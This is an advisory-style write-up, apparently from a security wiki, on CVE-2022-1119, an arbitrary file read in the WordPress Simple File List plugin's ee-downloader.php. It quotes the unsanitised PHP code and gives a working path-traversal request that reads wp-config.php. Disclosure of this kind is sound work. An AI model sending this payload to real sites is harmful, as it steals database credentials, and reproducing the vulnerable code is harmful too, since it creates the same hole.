# WordPress Simple File List ee-downloader.php Arbitrary file reading vulnerability CVE-2022-1119

## Vulnerability Description

WordPress Simple File List plug-in ee-downloader.php file has arbitrary file reading vulnerability, and attackers can read any file in the server through the vulnerability.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">WordPress Simple File List < 3.2.8</span>

## Plugin Name

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Simple File List</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">https://downloads.wordpress.org/plugin/simple-file-list.3.2.17.zip</span>

## Vulnerability reappears

The vulnerable file is `wp-content/plugins/simple-file-list/includes/ee-downloader.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1656833917266-d2d288f0-265a-426f-9096-b89b600be62a.png)

```php
<?php // Simple File List - ee-downloader.php - rev 1.19 - mitchellbennis@gmail.com

// Force File to Download
// This script is accessed via javascript on ee-download.php 

$eeFile =  filter_var($_GET['eeFile'], FILTER_SANITIZE_STRING, FILTER_FLAG_ENCODE_LOW);

if(is_readable($eeFile)) {

    header('Pragma: public'); // required
    header('Expires: 0'); // no cache
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Last-Modified: '. gmdate ('D, d M Y H:i:s', filemtime ($eeFile)) .' GMT');
    header('Cache-Control: private',false);
    header('Content-Type: ' . mime_content_type($eeFile) );
    header('Content-Disposition: attachment; filename="'. basename($eeFile) .'"');
    // header('Content-Transfer-Encoding: binary');
    header('Content-Length: '. filesize($eeFile)); // provide file size
    header('Connection: close');
    readfile($eeFile); // Start the download

}
?>
```

Directly transfer parameters to obtain file information, verify POC

```php
/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1656833959273-cb7b870d-acb3-4804-88c2-ca3531195dc7.png)